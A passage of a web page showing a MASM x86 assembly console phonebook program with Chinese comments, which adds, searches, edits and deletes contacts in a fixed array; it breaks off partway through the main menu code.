class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br></pre></td><td class="code"><pre><span class="line">.586</span><br><span class="line">.model flat ,stdcall</span><br><span class="line"></span><br><span class="line">include msvcrt.inc</span><br><span class="line">includelib msvcrt.lib</span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib kernel32.lib</span><br><span class="line"></span><br><span class="line">ExitProcess PROTO, dwExitCode:DWORD</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">;清零用</span><br><span class="line">zero db 20 dup(0)</span><br><span class="line">;换行符</span><br><span class="line">endl EQU &lt;0dh,0ah&gt;</span><br><span class="line">;冒号</span><br><span class="line">maohao db &quot;:&quot;,0</span><br><span class="line"></span><br><span class="line">;结构体存储名字电话</span><br><span class="line">Contact struct</span><br><span class="line">user db 20 dup(0)</span><br><span class="line">tel db 20 dup(0)</span><br><span class="line">Contact ends</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;定义一个结构体数组存储所有联系人</span><br><span class="line">ContactList Contact 100 dup(&lt;&#39;0&#39;&gt;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;保存结构体数组查询出来的信息</span><br><span class="line">s_user db 20 dup(0)</span><br><span class="line">s_tel db 20 dup(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;定义一个临时结构用来传送数据</span><br><span class="line">tmpContact Contact &lt;&#39;john&#39;,&#39;123123123123&#39;&gt;</span><br><span class="line">;默认数据</span><br><span class="line">tmpContact2 Contact &lt;&#39;chill&#39;,&#39;123123123123&#39;&gt;</span><br><span class="line">tmpContact3 Contact &lt;&#39;bob&#39;,&#39;123123123123&#39;&gt;</span><br><span class="line">;测试用查找字符</span><br><span class="line">s_test_user db 20 dup(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;输入格式</span><br><span class="line">input_format_str db &quot;%s&quot;,0</span><br><span class="line"></span><br><span class="line">;存放输入的变量</span><br><span class="line">inputstr db 20 dup(0)</span><br><span class="line">;查询用户名变量</span><br><span class="line">searchstr db 20 dup(0)</span><br><span class="line"></span><br><span class="line">;现有数据数</span><br><span class="line">count dd 1 dup(0)</span><br><span class="line"></span><br><span class="line">;修改数据flag</span><br><span class="line">xg_flag dd 1 dup(0)</span><br><span class="line"></span><br><span class="line">;删除数据flag</span><br><span class="line">sc_flag dd 1 dup(0)</span><br><span class="line"></span><br><span class="line">;分割线</span><br><span class="line">line db &quot;----------------------------------&quot;,endl,0</span><br><span class="line"></span><br><span class="line">;问候语</span><br><span class="line">input_user_text db &quot;请输入联系人姓名：&quot;,endl,0</span><br><span class="line">input_tel_text db &quot;请输入联系人电话：&quot;,endl,0</span><br><span class="line"></span><br><span class="line">search_info db &quot;查询到信息如下：&quot;,endl,0</span><br><span class="line"></span><br><span class="line">edit_user db endl,&quot;请输入新的用户名：&quot;,endl,0</span><br><span class="line">edit_tel db &quot;请输入新的电话号码：&quot;,endl,0</span><br><span class="line">search_success db &quot;查询成功&quot;,endl,0</span><br><span class="line">edit_success db &quot;修改成功&quot;,endl,0</span><br><span class="line">add_success db &quot;添加成功&quot;,endl,0</span><br><span class="line">rm_success db &quot;删除成功&quot;,endl,0</span><br><span class="line">addtmp_success db &quot;添加临时数据成功,临时数据为:john、chill、bob&quot;,endl,0</span><br><span class="line"></span><br><span class="line">;菜单</span><br><span class="line">bookmenu db &quot;电话簿（Console版）v0.1&quot;,endl,</span><br><span class="line">&quot;1. 添加数据&quot;,endl,</span><br><span class="line">&quot;2. 查询数据&quot;,endl,</span><br><span class="line">&quot;3. 修改数据&quot;,endl,</span><br><span class="line">&quot;4. 删除数据&quot;,endl,</span><br><span class="line">&quot;5. 添加测试用数据&quot;,endl,</span><br><span class="line">&quot;6. 退出程序&quot;,endl,</span><br><span class="line">&quot;请输入选项:&gt;&quot;,0</span><br><span class="line"></span><br><span class="line">choose db 1 dup(0)</span><br><span class="line"></span><br><span class="line">chooselist db &quot; 123456&quot;,0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">addContact proc</span><br><span class="line">;消息提示1：请输入联系人姓名</span><br><span class="line">push offset input_user_text</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">;输入</span><br><span class="line">push offset inputstr</span><br><span class="line">push offset input_format_str</span><br><span class="line">call crt_scanf</span><br><span class="line">add esp,8</span><br><span class="line"></span><br><span class="line">;保存到临时用结构里</span><br><span class="line">lea esi ,offset inputstr</span><br><span class="line">lea edi ,offset tmpContact.user</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;inputstr清零</span><br><span class="line">lea esi ,offset zero</span><br><span class="line">lea edi ,offset inputstr</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;----------------------------------------</span><br><span class="line"></span><br><span class="line">;消息提示2：请输入联系人电话</span><br><span class="line">push offset input_tel_text</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">;输入</span><br><span class="line">push offset inputstr</span><br><span class="line">push offset input_format_str</span><br><span class="line">call crt_scanf</span><br><span class="line">add esp,8</span><br><span class="line"></span><br><span class="line">;保存到临时用结构里</span><br><span class="line">lea esi ,offset inputstr</span><br><span class="line">lea edi ,offset tmpContact.tel</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;inputstr清零</span><br><span class="line">lea esi ,offset zero</span><br><span class="line">lea edi ,offset inputstr</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;-----------------------------------------</span><br><span class="line"></span><br><span class="line">;保存到数据结构的最后</span><br><span class="line">lea esi ,offset tmpContact</span><br><span class="line">lea edi ,offset ContactList</span><br><span class="line"></span><br><span class="line">;计算偏移,并移动</span><br><span class="line">mov eax ,sizeof(Contact)</span><br><span class="line">mov ecx ,count</span><br><span class="line">imul eax,ecx</span><br><span class="line">add edi ,eax</span><br><span class="line">mov ecx ,40</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">push offset add_success</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;总数+1</span><br><span class="line">inc count</span><br><span class="line"></span><br><span class="line">;tmpContact 清零</span><br><span class="line">lea esi ,offset zero</span><br><span class="line">lea edi ,offset tmpConTact.user</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line">lea esi ,offset zero</span><br><span class="line">lea edi ,offset tmpConTact.tel</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;返回</span><br><span class="line">retn</span><br><span class="line">addContact endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_default_data proc</span><br><span class="line">;默认添加的数据</span><br><span class="line">lea esi ,offset tmpContact</span><br><span class="line">lea edi ,offset ContactList</span><br><span class="line">mov eax ,sizeof(Contact)</span><br><span class="line">mov ecx ,count</span><br><span class="line">imul eax,ecx</span><br><span class="line">add edi ,eax</span><br><span class="line">mov ecx ,40</span><br><span class="line">rep movsb</span><br><span class="line">inc count</span><br><span class="line"></span><br><span class="line">lea esi ,offset tmpContact2</span><br><span class="line">lea edi ,offset ContactList</span><br><span class="line">mov eax ,sizeof(Contact)</span><br><span class="line">mov ecx ,count</span><br><span class="line">imul eax,ecx</span><br><span class="line">add edi ,eax</span><br><span class="line">mov ecx ,40</span><br><span class="line">rep movsb</span><br><span class="line">inc count</span><br><span class="line"></span><br><span class="line">lea esi ,offset tmpContact3</span><br><span class="line">lea edi ,offset ContactList</span><br><span class="line">mov eax ,sizeof(Contact)</span><br><span class="line">mov ecx ,count</span><br><span class="line">imul eax,ecx</span><br><span class="line">add edi ,eax</span><br><span class="line">mov ecx ,40</span><br><span class="line">rep movsb</span><br><span class="line">inc count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">retn</span><br><span class="line">add_default_data endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">searchContact proc</span><br><span class="line">;消息提示1：请输入待查询联系人姓名</span><br><span class="line">push offset input_user_text</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">;输入</span><br><span class="line">push offset searchstr</span><br><span class="line">push offset input_format_str</span><br><span class="line">call crt_scanf</span><br><span class="line">add esp,8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov edx ,0</span><br><span class="line">mov ebx ,count</span><br><span class="line">l:</span><br><span class="line">cmp edx ,ebx</span><br><span class="line">jz exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea esi ,offset ContactList</span><br><span class="line">lea edi ,offset searchstr</span><br><span class="line"></span><br><span class="line">mov eax ,sizeof(Contact)</span><br><span class="line">imul eax,edx</span><br><span class="line">add esi ,eax</span><br><span class="line"></span><br><span class="line">mov ecx ,20</span><br><span class="line">repe cmpsb</span><br><span class="line">jz s</span><br><span class="line"></span><br><span class="line">inc edx</span><br><span class="line"></span><br><span class="line">jnz l</span><br><span class="line">s:</span><br><span class="line">inc edx</span><br><span class="line">push edx</span><br><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line"></span><br><span class="line">;将查到的数据存起来</span><br><span class="line">sub esi ,20</span><br><span class="line">lea edi ,offset tmpContact.user</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line">lea edi ,offset tmpContact.tel</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">invoke crt_printf ,offset search_info</span><br><span class="line">invoke crt_printf ,offset tmpContact.user</span><br><span class="line">invoke crt_printf ,offset maohao</span><br><span class="line">invoke crt_printf ,offset tmpContact.tel</span><br><span class="line"></span><br><span class="line">;检测是否需要修改</span><br><span class="line">lea edi ,offset xg_flag</span><br><span class="line">lea esi ,offset chooselist</span><br><span class="line">add esi ,1</span><br><span class="line">mov ecx ,1</span><br><span class="line">repe cmpsb</span><br><span class="line">jz xg</span><br><span class="line"></span><br><span class="line">;检测是否需要删除</span><br><span class="line">lea edi ,offset sc_flag</span><br><span class="line">lea esi ,offset chooselist</span><br><span class="line">add esi ,1</span><br><span class="line">mov ecx ,1</span><br><span class="line">repe cmpsb</span><br><span class="line">jz sc</span><br><span class="line"></span><br><span class="line">pop eax</span><br><span class="line">pop ebx</span><br><span class="line">pop edx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jmp l</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">;inputstr清零</span><br><span class="line">lea esi ,offset zero</span><br><span class="line">lea edi ,offset searchstr</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xg:</span><br><span class="line">pop eax</span><br><span class="line">call editContact</span><br><span class="line">pop ebx</span><br><span class="line">pop edx</span><br><span class="line">jmp l</span><br><span class="line"></span><br><span class="line">sc:</span><br><span class="line">pop eax</span><br><span class="line">call rmContact</span><br><span class="line">pop ebx</span><br><span class="line">pop edx</span><br><span class="line">jmp l</span><br><span class="line"></span><br><span class="line">searchContact endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">editContact proc</span><br><span class="line">push eax ;偏移量入栈</span><br><span class="line">;消息提示1：请输入新的联系人姓名</span><br><span class="line">push offset edit_user</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">;输入</span><br><span class="line">push offset inputstr</span><br><span class="line">push offset input_format_str</span><br><span class="line">call crt_scanf</span><br><span class="line">add esp,8</span><br><span class="line"></span><br><span class="line">;保存到临时用结构里</span><br><span class="line">lea esi ,offset inputstr</span><br><span class="line">lea edi ,offset tmpContact.user</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;inputstr清零</span><br><span class="line">lea esi ,offset zero</span><br><span class="line">lea edi ,offset inputstr</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;----------------------------------------</span><br><span class="line"></span><br><span class="line">;消息提示2：请输入新的联系人电话</span><br><span class="line">push offset edit_tel</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">;输入</span><br><span class="line">push offset inputstr</span><br><span class="line">push offset input_format_str</span><br><span class="line">call crt_scanf</span><br><span class="line">add esp,8</span><br><span class="line"></span><br><span class="line">;保存到临时用结构里</span><br><span class="line">lea esi ,offset inputstr</span><br><span class="line">lea edi ,offset tmpContact.tel</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;inputstr清零</span><br><span class="line">lea esi ,offset zero</span><br><span class="line">lea edi ,offset inputstr</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;-----------------------------------------</span><br><span class="line"></span><br><span class="line">;使用新的联系人覆盖老的联系人</span><br><span class="line">lea esi ,offset tmpContact</span><br><span class="line">lea edi ,offset ContactList</span><br><span class="line">;取出偏移量</span><br><span class="line">pop eax</span><br><span class="line">add edi ,eax</span><br><span class="line">mov ecx ,40</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;tmpContact 清零</span><br><span class="line">lea esi ,offset zero</span><br><span class="line">lea edi ,offset tmpConTact.user</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line">lea esi ,offset zero</span><br><span class="line">lea edi ,offset tmpConTact.tel</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;-----------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">editContact endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rmContact proc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;获取要删除的地址</span><br><span class="line">lea edi ,offset ContactList</span><br><span class="line">add edi ,eax</span><br><span class="line"></span><br><span class="line">;获取要删除的地址之后的地址</span><br><span class="line">lea esi ,offset ContactList</span><br><span class="line">add esi ,eax</span><br><span class="line">add esi ,sizeof(Contact)</span><br><span class="line"></span><br><span class="line">;获得要删除的地址之后的地址位数</span><br><span class="line">mov ecx ,count</span><br><span class="line">imul ecx,sizeof(Contact)</span><br><span class="line">sub ecx,eax</span><br><span class="line"></span><br><span class="line">;覆盖</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">dec count</span><br><span class="line"></span><br><span class="line">push offset rm_success</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">retn</span><br><span class="line">rmContact endp</span><br><span class="line"></span><br><span class="line">main proc</span><br><span class="line">menu:</span><br><span class="line">;显示菜单</span><br><span class="line">push offset bookmenu</span><br><span class="line">call crt_printf</span><br><span class="line">add esp ,4</span><br><span class="line"></span><br><span class="line">;输入选项</span><br><span class="line">push offset choose</span><br><span class="line">push offset input_format_str</span><br><span class="line">call crt_scanf</span><br><span class="line"></span><br><span class="line">;jcc跳转</span><br><span class="line">mov ebx ,1</span><br><span class="line"></span><br><span class="line">mov esi ,offset chooselist</span><br><span class="line">mov edi ,offset choose</span><br><span class="line">add esi ,ebx</span><br><span class="line">mov ecx ,1</span><br><span class="line">repe cmpsb</span><br><span class="line">jz c1</span><br><span class="line">inc ebx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov esi ,offset chooselist</span><br><span class="line">mov edi ,offset choose</span><br><span class="line">add esi ,ebx</span><br><span class="line">mov ecx ,1</span><br><span class="line">repe cmpsb</span><br><span class="line">jz c2</span><br><span class="line">inc ebx</span><br><span class="line"></span><br><span class="line">mov esi ,offset chooselist</span><br><span class="line">mov edi ,offset choose</span><br><span class="line">add esi ,ebx</span><br><span class="line">mov ecx ,1</span><br><span class="line">repe cmpsb</span><br><span class="line">jz c3</span><br><span class="line">inc ebx</span><br><span class="line"></span><br><span class="line">mov esi ,offset chooselist</span><br><span class="line">mov edi ,offset choose</span><br><span class="line">add esi ,ebx</span><br><span class="line">mov ecx ,1</span><br><span class="line">repe cmpsb</span><br><span class="line">jz c4</span><br><span class="line">inc ebx</span><br><span class="line"></span><br><span class="line">mov esi ,offset chooselist</span><br><span class="line">mov edi ,offset choose</span><br><span class="line">add esi ,ebx</span><br><span class="line">mov ecx ,1</span><br><span class="line">repe cmpsb</span><br><span class="line">jz c5</span><br><span class="line">inc ebx</span><br><span class="line"></span><br><span class="line">mov esi ,offset chooselist</span><br><span class="line">mov edi ,offset choose</span><br><span class="line">add esi ,ebx</span><br><span class="line">mov ecx ,1</span><br><span class="line">repe cmpsb</span><br><span class="line">jz c6</span><br><span class="line"></span><br><span class="line">jmp menu</span><br><span class="line"></span><br><span class="line">;增加数据</span><br><span class="line">c1:</span><br><span class="line">inc ebx</span><br><span class="line">call addContact</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push offset line</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jmp menu</span><br><span class="line"></span><br><span class="line">;查找数据</span><br><span class="line">c2:</span><br><span class="line">inc ebx</span><br><span class="line">call searchContact</span><br><span class="line"></span><br><span class="line">push offset search_success</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">push offset line</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line">jmp menu</span><br><span class="line"></span><br><span class="line">;修改数据</span><br><span class="line">c3:</span><br><span class="line">inc ebx</span><br><span class="line">lea edi ,offset xg_flag</span><br><span class="line">lea esi ,chooselist</span><br><span class="line">add esi ,1</span><br><span class="line">mov ecx ,1</span><br><span class="line">rep movsb</span><br><span class="line">call searchContact</span><br><span class="line"></span><br><span class="line">;把flag变回去</span><br><span class="line">lea edi ,offset xg_flag</span><br><span class="line">lea esi ,chooselist</span><br><span class="line">add esi ,0</span><br><span class="line">mov ecx ,1</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">push offset edit_success</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">push offset line</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line">jmp menu</span><br><span class="line"></span><br><span class="line">;删除数据</span><br><span class="line">c4:</span><br><span class="line">inc ebx</span><br><span class="line">lea edi ,offset sc_flag</span><br><span class="line">lea esi ,chooselist</span><br><span class="line">add esi ,1</span><br><span class="line">mov ecx ,1</span><br><span 